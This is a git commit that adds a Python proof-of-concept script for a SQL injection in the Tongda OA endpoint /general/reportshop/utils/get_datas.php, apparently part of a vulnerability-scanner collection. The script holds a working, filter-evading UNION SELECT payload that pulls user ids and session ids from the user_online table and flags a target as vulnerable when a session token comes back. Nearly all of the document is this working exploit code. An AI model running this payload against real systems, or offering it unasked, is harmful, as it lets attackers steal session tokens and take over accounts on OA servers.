29eee2a9265760465f0869060fc5f8eef9f56ed9
tr0uble_mAker <71172892+tr0uble-mAker@users.noreply.github.com>
2022-08-18 02:49:28 +0800

    新增POC  通达OA sql注入(/general/reportshop/utils/get_datas.php)

---
+++ pocs/web/tongda/tongda_sqli_getdata_php.py
@@ -0,0 +1,29 @@
+import random
+import requests
+import re, urllib
+
+def verify(url):
+    relsult = {
+        'name': '通达OA sql注入(/general/reportshop/utils/get_datas.php)',
+        'vulnerable': False
+    }
+    timeout = 3
+    payload = r'''?USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5%20whe\re%201={`\=%27`%201}%20un\ion%20(s\elect%20uid,sid%20fr\om%20user_online%20whe\re%201\={`=`%201})--%20%27'''
+    vurl = urllib.parse.urljoin(url, '/general/reportshop/utils/get_datas.php')
+    vurl2 = urllib.parse.urljoin(url, '/general/reportshop/utils/get_datas.php' + payload)
+    try:
+        rep1 = requests.get(vurl, timeout=timeout, verify=False)
+        if rep1.status_code == 200 and re.search("未指定业务", rep1.text):
+            rep2 = requests.get(vurl2, timeout=timeout, verify=False)
+            if rep2.status_code == 200 and re.search("[a-z0-9]{26}", rep2.text):
+                relsult['vulnerable'] = True
+                relsult['url'] = url
+                relsult['vurl'] = vurl2
+                relsult['about'] = 'https://forum.butian.net/share/278'
+                return relsult
+        else:
+            return relsult
+    # except Exception as e:
+    #     print(e)
+    except:
+        return relsult
